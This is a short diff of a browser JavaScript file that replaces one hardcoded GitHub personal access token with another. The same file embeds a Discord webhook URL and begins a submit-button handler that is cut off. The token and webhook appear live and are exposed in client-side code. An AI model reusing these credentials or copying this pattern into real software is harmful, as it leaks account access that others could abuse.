@@ -14,7 +14,7 @@ function crypt(str, alpha = {"a":2147,"b":3675,"c":5127,"d":7983,"e":1135,"f":13
 
 const owner = "rento2177";
 const repo = "security";
-const token = "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";
+const token = "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";
 const webhook = "https://discord.com/api/webhooks/1241558801300062248/RXqbiXmsG134fHdUQ6osa6b7Kd46m8z5mOywxIWXZK4DCwQXaf1z7ZFGcNZmDcG89IVJ";
 window.addEventListener("load", () => {
     document.getElementById("sbmit").addEventListener("click", async () => {
